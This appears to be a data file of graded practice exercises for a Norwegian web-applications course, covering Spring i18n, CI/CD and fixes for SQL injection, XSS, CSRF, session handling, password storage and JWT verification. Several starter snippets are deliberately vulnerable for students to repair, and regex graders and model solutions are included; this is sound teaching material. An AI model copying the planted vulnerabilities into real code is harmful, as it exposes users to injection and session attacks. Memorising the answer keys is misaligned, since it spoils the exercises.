    { label: "@Bean LocaleResolver", re: "@Bean[\\s\\S]{0,60}LocaleResolver\\s+localeResolver\\s*\\(" },
    { label: "CookieLocaleResolver brukes", re: "new\\s+CookieLocaleResolver" },
    { label: "Standardspråk settes (setDefaultLocale)", re: "setDefaultLocale\\s*\\(\\s*(Locale\\.(ENGLISH|US|UK)|new Locale|Locale\\.of|Locale\\.forLanguageTag)" },
    { label: "@Bean LocaleChangeInterceptor", re: "LocaleChangeInterceptor\\s+\\w+\\s*\\(" },
    { label: "setParamName(\"lang\")", re: "setParamName\\s*\\(\\s*\"lang\"\\s*\\)" },
    { label: "addInterceptors(InterceptorRegistry) registrerer den", re: "addInterceptors\\s*\\(\\s*InterceptorRegistry\\s+\\w+\\s*\\)[\\s\\S]*addInterceptor\\s*\\(" },
    { label: "Thymeleaf th:text=\"#{welcome.hello(...)}\"", re: "th:text\\s*=\\s*\"#\\{welcome\\.hello\\(" }
  ],
  solutionText: `@Configuration
public class I18nConfig implements WebMvcConfigurer {

    @Bean
    public LocaleResolver localeResolver() {
        CookieLocaleResolver resolver = new CookieLocaleResolver("lang");
        resolver.setDefaultLocale(Locale.ENGLISH);
        return resolver;
    }

    @Bean
    public LocaleChangeInterceptor localeChangeInterceptor() {
        LocaleChangeInterceptor interceptor = new LocaleChangeInterceptor();
        interceptor.setParamName("lang");
        return interceptor;
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(localeChangeInterceptor());
    }
}

<!-- Thymeleaf: -->
<p th:text="#{welcome.hello(\${#authentication.name})}">Hello user!</p>`
});

DAT.exercises.push({
  id: "g-props-h25",
  area: "g11n",
  type: "rubric",
  lang: "properties",
  level: 1,
  title: "Resource bundles for kursiden",
  source: "Eksamen h25 2b",
  prompt: `<p>Internasjonaliser siden og lag property-filene for engelsk og norsk. Skriv begge filene under hverandre, med en kommentarlinje <code># messages_en.properties</code> og <code># messages_no.properties</code> foran hver.</p>
<div class="card small"><b>DAT152 Advanced Web Applications</b><br>Date: 15/12/2025<br>This course has between 50 and 100 registered students<br>
<table><tr><th colspan="2">Course Details</th></tr><tr><td>Course Code</td><td>DAT152</td></tr><tr><td>Course Name</td><td>Advanced Web Applications</td></tr><tr><td>Semester</td><td>Autumn</td></tr><tr><td>Lecturers</td><td>Bjarte Kileng and Tosin Daniel Oyetoyan</td></tr></table><a>Course Description</a></div>`,
  starter: `# messages_en.properties


# messages_no.properties

`,
  checks: [
    { label: "To filer: _en og _no/_nb", re: "messages_en[\\s\\S]*messages_(no|nb)|messages_(no|nb)[\\s\\S]*messages_en" },
    { label: "Samme nøkler i begge filer", custom: "propsKeysMatch" },
    { label: "Minst 8 nøkler per fil", custom: "propsMinKeys8" },
    { label: "Dato er en parameter ({0}), ikke hardkodet", re: "(Date|Dato)[^\\n=]*=[^\\n]*\\{\\d|=\\s*(Date|Dato):?\\s*\\{\\d" },
    { label: "Tallene 50 og 100 er parametere", re: "\\{0[^}]*\\}[^\\n]*\\{1[^}]*\\}" },
    { label: "Ikke «50 and 100» hardkodet i teksten", not: "50\\s+(and|og)\\s+100" },
    { label: "Norsk oversettelse finnes (f.eks. «Dato», «Emne»)", re: "Dato|Emne|emne|Forelesere|Høst|registrerte" },
    { label: "Tabell-labels og lenketekst er med", re: "(Course Code|Course Name)[\\s\\S]*(Description|Beskrivelse)" }
  ],
  solutionRef: "spring-i18n"
});

DAT.exercises.push({
  id: "g-props-v26",
  area: "g11n",
  type: "rubric",
  lang: "properties",
  level: 1,
  title: "Resource bundles for e-Library",
  source: "Eksamen v26 2b",
  prompt: `<p>Lag property-filene (engelsk + norsk) for siden:</p>
<div class="card small"><b>Welcome to e-Library (Spring MVC)</b><br><a>EN</a> | <a>NO</a><br><b>Hello</b> anonymousUser! <button type="button" disabled>Log out</button><br><a>View Books</a> | <a>Add Books</a> | <a>Add Author</a></div>
<p>Skriv med kommentarlinjene <code># messages_en.properties</code> og <code># messages_no.properties</code>.</p>`,
  starter: `# messages_en.properties


# messages_no.properties

`,
  checks: [
    { label: "To filer: _en og _no/_nb", re: "messages_en[\\s\\S]*messages_(no|nb)|messages_(no|nb)[\\s\\S]*messages_en" },
    { label: "Samme nøkler i begge filer", custom: "propsKeysMatch" },
    { label: "Minst 6 nøkler per fil", custom: "propsMinKeys6" },
    { label: "Brukernavnet er en parameter ({0})", re: "(Hello|Hei)[^\\n]*\\{0\\}" },
    { label: "anonymousUser er ikke hardkodet", not: "anonymousUser" },
    { label: "Log out / Logg ut", re: "Log out[\\s\\S]*Logg ut|Logg ut[\\s\\S]*Log out" },
    { label: "Lenkene er med (View Books / Vis bøker …)", re: "View Books[\\s\\S]*(Vis bøker|Se bøker)|(Vis bøker|Se bøker)[\\s\\S]*View Books" }
  ],
  solutionRef: "spring-i18n"
});

DAT.exercises.push({
  id: "wf-cicd",
  area: "wf",
  type: "rubric",
  lang: "yaml",
  level: 2,
  title: "Skriv en CI/CD-pipeline (GitHub Actions)",
  source: "Pensum: CI/CD yaml",
  prompt: `<p>Skriv en GitHub Actions-workflow for et Maven/Spring Boot-prosjekt som:</p>
<ol><li>kjører ved push og pull request til <code>main</code>,</li><li>sjekker ut koden, setter opp JDK 21, bygger og kjører tester med Maven,</li>
<li>har en egen <code>deploy</code>-jobb som bare kjører hvis build lykkes, og bruker en hemmelighet fra <code>secrets</code>.</li></ol>`,
  starter: `name: CI/CD

`,
  checks: [
    { label: "Trigger: on push og pull_request", re: "on:[\\s\\S]*push[\\s\\S]*pull_request|on:[\\s\\S]*pull_request[\\s\\S]*push" },
    { label: "Begrenset til main", re: "main" },
    { label: "jobs: med runs-on", re: "jobs:[\\s\\S]*runs-on:" },
    { label: "actions/checkout", re: "uses:\\s*actions/checkout" },
    { label: "actions/setup-java med java-version 21", re: "actions/setup-java[\\s\\S]*java-version:\\s*'?\"?21" },
    { label: "Bygger og tester med Maven (mvn … test/verify/package)", re: "mvn[^\\n]*(test|verify|package|install)" },
    { label: "deploy-jobb med needs: build", re: "deploy:[\\s\\S]*needs:\\s*\\[?\\s*build" },
    { label: "Bruker secrets.*", re: "secrets\\.\\w+" }
  ],
  solutionRef: "cicd"
});

/* ============================ SIKKERHET (sjekkliste) ============================ */

DAT.exercises.push({
  id: "sec-sqli-login",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 1,
  title: "Fiks SQLi i innlogging (PreparedStatement-fella)",
  source: "Eksamen v26 4a, v24 5d, h24 5c",
  prompt: `<p>Koden under bruker PreparedStatement, men er likevel sårbar. Skriv den om slik at den er trygg.</p>`,
  starter: `String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username + " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
`,
  checks: [
    { label: "Plassholdere: USERNAME = ? og PASSWORD = ?", re: "USERNAME\\s*=\\s*\\?[\\s\\S]*PASSWORD\\s*=\\s*\\?" },
    { label: "Ingen konkatenering av input i SQL-en", not: "\"\\s*\\+\\s*(username|password)|(username|password)\\s*\\+\\s*\"" },
    { label: "conn.prepareStatement(sql) brukes", re: "prepareStatement\\s*\\(" },
    { label: "setString(1, username)", re: "setString\\s*\\(\\s*1\\s*,\\s*username\\s*\\)" },
    { label: "setString(2, password)", re: "setString\\s*\\(\\s*2\\s*,\\s*password\\s*\\)" },
    { label: "Bonus: SELECT kjøres med executeQuery()", re: "executeQuery\\s*\\(\\s*\\)", weight: 0.5 }
  ],
  solutionText: `String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = ? AND PASSWORD = ?";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();

// Why it was vulnerable: the untrusted values were concatenated into the SQL
// string BEFORE prepareStatement(), so they became part of the SQL code.`
});

DAT.exercises.push({
  id: "sec-sqli-orderby",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Fiks SQLi i ORDER BY (sortering)",
  source: "Eksamen h25 4d, h22 5b",
  prompt: `<p><code>sortkey</code> kommer fra skjemaet og skal være enten <code>datetime</code> (Date) eller <code>searchkey</code> (Search Word). Skriv en sikker versjon.</p>`,
  starter: `public List<SearchItem> getSearchHistoryForUser(String username, String sortkey) {
    String sql = "SELECT * FROM SecOblig.History "
               + "WHERE username = '" + username
               + "' ORDER BY " + sortkey + " ASC";
    return getSearchItemList(sql, 50);
}
`,
  checks: [
    { label: "username bindes med ? (WHERE username = ?)", re: "username\\s*=\\s*\\?" },
    { label: "setString(1, username)", re: "setString\\s*\\(\\s*1\\s*,\\s*username\\s*\\)" },
    { label: "Allow-list: sammenligner mot \"datetime\" og \"searchkey\"", re: "\"datetime\"[\\s\\S]*\"searchkey\"|\"searchkey\"[\\s\\S]*\"datetime\"" },
    { label: "Ugyldig verdi håndteres (default / else / throw)", re: "default\\s*:|else|throw\\s+new|getOrDefault|orElse" },
    { label: "username konkateneres ikke inn", not: "'\"\\s*\\+\\s*username|\\+\\s*username\\s*\\+" },
    { label: "Tryggest: rå sortkey konkateneres ikke direkte (bruk hardkodet kolonne)", not: "\\+\\s*sortkey\\b", weight: 0.5 }
  ],
  solutionRef: "sqli"
});

DAT.exercises.push({
  id: "sec-sqli-insert",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 1,
  title: "Fiks SQLi i INSERT",
  source: "Eksamen h23 5b",
  prompt: `<p>Mitiger SQL injection:</p>`,
  starter: `String sqlQuery = "INSERT INTO USERS (id, name, email) VALUES ('"+id+"','"+name+"','"+email+"')";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
`,
  checks: [
    { label: "VALUES (?, ?, ?)", re: "VALUES\\s*\\(\\s*\\?\\s*,\\s*\\?\\s*,\\s*\\?\\s*\\)" },
    { label: "Ingen konkatenering av input", not: "\\+\\s*(id|name|email)\\s*\\+" },
    { label: "Binder alle tre (setString/setLong 1, 2, 3)", re: "set\\w+\\s*\\(\\s*1\\s*,[\\s\\S]*set\\w+\\s*\\(\\s*2\\s*,[\\s\\S]*set\\w+\\s*\\(\\s*3\\s*," },
    { label: "executeUpdate() for INSERT", re: "executeUpdate\\s*\\(" }
  ],
  solutionText: `String sql = "INSERT INTO USERS (id, name, email) VALUES (?, ?, ?)";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, id);
stmt.setString(2, name);
stmt.setString(3, email);
stmt.executeUpdate();`
});

DAT.exercises.push({
  id: "sec-logout",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 1,
  title: "Fiks logout som ikke invaliderer sesjonen",
  source: "Eksamen h24 5b",
  prompt: `<p>Hvilken sårbarhet har denne logout-servleten? Skriv en sikker versjon.</p>`,
  starter: `protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    request.getSession().removeAttribute("user");
    response.sendRedirect("login");
}
`,
  checks: [
    { label: "Invaliderer hele sesjonen: session.invalidate()", re: "\\.invalidate\\s*\\(\\s*\\)" },
    { label: "getSession(false) – lager ikke ny sesjon unødvendig", re: "getSession\\s*\\(\\s*false\\s*\\)", weight: 0.5 },
    { label: "null-sjekk av session", re: "!=\\s*null|==\\s*null", weight: 0.5 },
    { label: "Sletter cookie (setMaxAge(0))", re: "setMaxAge\\s*\\(\\s*0\\s*\\)", weight: 0.5 },
    { label: "Redirect til login etterpå", re: "sendRedirect" }
  ],
  solutionRef: "session"
});

DAT.exercises.push({
  id: "sec-fixation",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Fiks session fixation ved innlogging",
  source: "Eksamen h23 5d",
  prompt: `<p>Hvilken sesjonssårbarhet har login-controlleren? Fiks den.</p>`,
  starter: `protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    boolean successfulLogin = false;
    String username = validate(request.getParameter("username"));
    String password = validate(request.getParameter("password"));
    if (username != null && password != null) {
        AppUser authUser = getAuthenticatedUser(username, password);
        if (authUser != null) {
            successfulLogin = true;
            request.getSession().setAttribute("user", authUser);
        }
    }
    // do authenticated stuff...
}
`,
  checks: [
    { label: "Ny session-ID etter innlogging (invalidate + getSession(true) eller changeSessionId())", re: "changeSessionId\\s*\\(|invalidate\\s*\\(\\s*\\)[\\s\\S]*getSession\\s*\\(\\s*(true)?\\s*\\)" },
    { label: "Gjøres inne i if (authUser != null)", re: "authUser\\s*!=\\s*null[\\s\\S]*(changeSessionId|invalidate)" },
    { label: "Brukeren lagres i den NYE sesjonen", re: "(changeSessionId|getSession\\s*\\(\\s*(true)?\\s*\\))[\\s\\S]*setAttribute\\s*\\(\\s*\"user\"" }
  ],
  solutionRef: "session"
});

DAT.exercises.push({
  id: "sec-xss-java",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 1,
  title: "Fiks reflected XSS i servlet",
  source: "Eksamen h22 5c",
  prompt: `<p>Koden prøver å stoppe XSS ved å fjerne <code>&lt;script&gt;</code>. Forklar for deg selv hvorfor det ikke virker, og skriv en sikker versjon.</p>`,
  starter: `private void snippet2(HttpServletRequest request, HttpServletResponse response) throws Throwable {
    String data = request.getParameter("name");
    if (data != null) {
        response.getWriter().println("<br> data = " + data.replaceAll("(<script>)", ""));
    }
}
`,
  checks: [
    { label: "Output-encoder (Encode.forHtml / escapeHtml4 / HtmlUtils.htmlEscape)", re: "Encode\\.forHtml(Content)?\\s*\\(|escapeHtml4?\\s*\\(|htmlEscape\\s*\\(|escapeXml\\s*\\(" },
    { label: "Blacklist-filteret (replaceAll <script>) er fjernet", not: "replaceAll\\s*\\(\\s*\"\\(?<script>" },
    { label: "Encodingen brukes på data i println", re: "println\\s*\\([^;]*(Encode\\.forHtml|escapeHtml|htmlEscape|escapeXml)[^;]*data" }
  ],
  solutionRef: "xss"
});

DAT.exercises.push({
  id: "sec-csrf",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Implementer synchronizer token (CSRF)",
  source: "Eksamen h23 5c II",
  prompt: `<p>Skriv kode som (1) genererer et CSRF-token ved innlogging og lagrer det i sesjonen, (2) viser hvordan det legges i skjemaet, og (3) validerer tokenet i <code>doPost</code> for <code>/transfer</code> og avviser med 403 hvis det ikke stemmer.</p>`,
  starter: `// 1. At login


// 2. In the form (HTML/Thymeleaf)


// 3. In TransferServlet.doPost

`,
  checks: [
    { label: "Tilfeldig token med SecureRandom (eller UUID)", re: "SecureRandom|UUID\\.randomUUID" },
    { label: "Lagres i sesjonen (session.setAttribute)", re: "setAttribute\\s*\\(\\s*\"\\w*csrf\\w*\"", flags: "i" },
    { label: "Hidden field i skjemaet", re: "type\\s*=\\s*\"hidden\"[^>]*csrf|csrf[^>]*type\\s*=\\s*\"hidden\"", flags: "i" },
    { label: "Henter innsendt token (getParameter)", re: "getParameter\\s*\\(\\s*\"\\w*csrf\\w*\"", flags: "i" },
    { label: "Sammenligner med token i sesjonen", re: "getAttribute\\s*\\(\\s*\"\\w*csrf\\w*\"[\\s\\S]*(equals|isEqual)|(equals|isEqual)[\\s\\S]*getAttribute\\s*\\(\\s*\"\\w*csrf", flags: "i" },
    { label: "Avviser med 403 / sendError ved feil", re: "SC_FORBIDDEN|403|sendError" }
  ],
  solutionText: `// 1. At login (after successful authentication)
SecureRandom random = new SecureRandom();
byte[] bytes = new byte[32];
random.nextBytes(bytes);
String csrfToken = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
request.getSession().setAttribute("csrfToken", csrfToken);

// 2. In the form (Thymeleaf)
<form th:action="@{/transfer}" method="post">
    <input type="hidden" name="csrfToken" th:value="\${session.csrfToken}">
    ...
</form>

// 3. In TransferServlet.doPost
HttpSession session = request.getSession(false);
String sent = request.getParameter("csrfToken");
String expected = session == null ? null : (String) session.getAttribute("csrfToken");
if (sent == null || expected == null
        || !MessageDigest.isEqual(sent.getBytes(), expected.getBytes())) {
    response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid CSRF token");
    return;
}
// token OK -> perform the transfer`
});

DAT.exercises.push({
  id: "sec-pwhash",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Lagre passord sikkert (slow hash + salt + pepper)",
  source: "Eksamen v24/h23/h24/h25/v26: password storage",
  prompt: `<p>Skriv <code>register(username, password)</code> som lagrer passordet sikkert, og <code>login(username, password)</code> som verifiserer. Bruk en slow hash (PBKDF2, bcrypt, scrypt eller Argon2), unik salt per bruker og en pepper som ikke ligger i databasen.</p>`,
  starter: `public void register(String username, String password) {

}

public boolean login(String username, String password) {

}
`,
  checks: [
    { label: "Slow hash: PBKDF2 / BCrypt / SCrypt / Argon2", re: "PBKDF2|BCrypt|bcrypt|SCrypt|scrypt|Argon2" },
    { label: "Salt genereres med SecureRandom (eller av BCrypt)", re: "SecureRandom|BCrypt\\.gensalt|BCryptPasswordEncoder|Argon2PasswordEncoder" },
    { label: "Work factor / iterasjoner angitt", re: "\\b\\d{4,}\\b|BCryptPasswordEncoder\\s*\\(\\s*\\d+|gensalt\\s*\\(\\s*\\d+|cost|iterations", flags: "i" },
    { label: "Pepper brukes (hemmelig verdi utenfor DB)", re: "pepper", flags: "i" },
    { label: "Lagrer hash (+ salt) – ikke klartekst", re: "save\\w*\\s*\\([^)]*(hash|Hash)" },
    { label: "Login: sammenligner hasher / encoder.matches", re: "matches\\s*\\(|isEqual\\s*\\(|equals\\s*\\(" },
    { label: "Ingen MD5/SHA-1", not: "MD5|SHA-1|SHA1" }
  ],
  solutionText: `private static final int ITERATIONS = 310000;
private final String PEPPER = System.getenv("PASSWORD_PEPPER");   // not in the database

public void register(String username, String password) throws Exception {
    byte[] salt = new byte[16];
    new SecureRandom().nextBytes(salt);                            // unique per user
    byte[] hash = pbkdf2(password, salt);
    userDAO.saveUser(username, toHex(hash), toHex(salt), ITERATIONS);
}

public boolean login(String username, String password) throws Exception {
    AppUser user = userDAO.getUser(username);
    if (user == null) return false;
    byte[] hash = pbkdf2(password, fromHex(user.getSalt()));
    return MessageDigest.isEqual(hash, fromHex(user.getHash()));  // constant-time compare
}

private byte[] pbkdf2(String password, byte[] salt) throws Exception {
    PBEKeySpec spec = new PBEKeySpec((password + PEPPER).toCharArray(), salt, ITERATIONS, 256);
    return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
}

// Alternative with Spring Security:
// PasswordEncoder encoder = new BCryptPasswordEncoder(12);
// saveUser(username, encoder.encode(password + PEPPER));
// encoder.matches(password + PEPPER, storedHash);`
});

DAT.exercises.push({
  id: "sec-jwtverify",
  area: "sec",
  type: "rubric",
  lang: "java",
  level: 3,
  title: "Verifiser JWT på Resource Server",
  source: "Eksamen v24 5f, h23 5f, h25 4f",
  prompt: `<p>Skriv en metode <code>Claims verify(String accessToken)</code> med jjwt som avviser usignerte/manipulerte tokens, sjekker issuer og audience, og returnerer claims. Utløp skal også sjekkes. Bruk <code>PUBLIC_KEY</code> (RS256).</p>`,
  starter: `public Claims verify(String accessToken) throws InvalidTokenException {

}
`,
  checks: [
    { label: "Bruker parseClaimsJws / parseSignedClaims (ikke parse())", re: "parseClaimsJws\\s*\\(|parseSignedClaims\\s*\\(" },
    { label: "Ikke den usikre parse(token)", not: "\\.parse\\s*\\(\\s*accessToken\\s*\\)" },
    { label: "Signeringsnøkkel settes (setSigningKey / verifyWith)", re: "setSigningKey\\s*\\(|verifyWith\\s*\\(" },
    { label: "Sjekker issuer (requireIssuer eller getIssuer)", re: "requireIssuer|getIssuer" },
    { label: "Sjekker audience (requireAudience eller getAudience)", re: "requireAudience|getAudience" },
    { label: "Utløp sjekkes (ExpiredJwtException fanges, eller getExpiration)", re: "ExpiredJwtException|getExpiration|JwtException" },
    { label: "Feil → InvalidTokenException", re: "throw\\s+new\\s+InvalidTokenException" }
  ],
  solutionText: `public Claims verify(String accessToken) throws InvalidTokenException {
    try {
        Jws<Claims> jws = Jwts.parser()
                .setSigningKey(PUBLIC_KEY)               // verifyWith(PUBLIC_KEY) in jjwt 0.12
                .requireIssuer("http://localhost:9092/DAT152WebSearch")
                .requireAudience("blogapp")
                .build()
                .parseClaimsJws(accessToken);            // rejects unsigned (alg none) and bad signatures,
                                                         // and throws ExpiredJwtException if exp has passed
        return jws.getBody();
    } catch (JwtException | IllegalArgumentException e) {
        throw new InvalidTokenException(e);
    }
}`
});
